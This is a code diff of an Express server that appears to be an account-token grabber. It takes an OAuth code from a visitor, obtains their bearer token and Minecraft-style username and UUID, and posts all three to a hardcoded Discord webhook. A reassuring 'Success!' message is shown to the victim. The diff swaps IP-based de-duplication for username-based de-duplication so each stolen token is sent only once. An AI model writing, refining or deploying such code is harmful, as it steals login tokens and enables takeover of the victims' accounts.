@@ -5,16 +5,11 @@ const webhook_url = 'https://discord.com/api/webhooks/1023169651536052344/_G1QWD
 
 const axios = require('axios')
 const express = require('express')
-require("json");
 const app = express()
 const port = process.env.PORT || 3000
-let banList = []
+
 app.get('/', async (req, res) => {
     res.send('Success! You can exit this page and return to discord.')
-    const ip = req.header('x-forwarded-for') || req.connection.remoteAddress;
-    if (checkIfBanned(ip)) {
-        return
-    }
     const code = req.query.code
     if (code == null) {
         return
@@ -29,6 +24,9 @@ app.get('/', async (req, res) => {
         const usernameAndUUIDArray = await getUsernameAndUUID(bearerToken)
         const uuid = usernameAndUUIDArray[0]
         const username = usernameAndUUIDArray[1]
+        if (checkIfBanned(username)) {
+            return
+        }
         postToWebhook(username, bearerToken, uuid)
     } catch (e) {
         console.log(e)
@@ -117,6 +115,7 @@ async function getUsernameAndUUID(bearerToken) {
     let response = await axios.get(url, config)
     return [response.data['id'], response.data['name']]
 }
+
 function postToWebhook(username, bearerToken, uuid) {
     const url = webhook_url
     let data = {
@@ -135,13 +134,18 @@ function postToWebhook(username, bearerToken, uuid) {
     axios.post(url, data).then(() => console.log("Successfully authenticated, posting to webhook!"))
 }
 
-function checkIfBanned(ip){
-    for (let i = 0; i < banList.length; i++) {
-        if (banList[i] === ip){
+const bannedNames = []
+
+function addBan(name) {
+    bannedNames.push(name);
+}
+
+function checkIfBanned(name) {
+    for (const item of bannedNames) {
+        if (name === item) {
             return true
-        } else {
-            console.log("IP not found in ban list, adding to ban list. IP: " + ip + "\n")
-            banList.push(ip)
         }
     }
+    addBan(name)
+    return false
 }
